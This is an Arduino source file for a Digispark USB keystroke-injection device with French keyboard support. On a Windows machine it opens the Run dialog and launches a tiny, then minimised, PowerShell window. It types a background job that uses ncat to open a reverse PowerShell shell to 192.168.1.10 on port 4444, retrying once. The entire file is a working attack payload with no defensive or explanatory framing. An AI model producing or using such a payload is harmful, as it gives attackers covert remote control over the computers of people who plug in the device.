#include "DigiKeyboardFr.h"
#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //Open the Run dialog box
  DigiKeyboardFr.delay(500);// wait for the dialog box appear
  DigiKeyboardFr.print("PowerShell.exe -noe -c \". mode.com con: lines=15 cols=15\"");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("start-job -scriptblock {try{ncat 192.168.1.10 4444 -e powershell.exe}finally{if (1) {ncat 192.168.1.10 4444 -e powershell.exe}}}");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
  DigiKeyboardFr.sendKeyStroke(KEY_FR_F);
  while (1)
  {
    digitalWrite(0, HIGH);
    delay(300);
    digitalWrite(0, LOW);
    delay(300);
  }
}
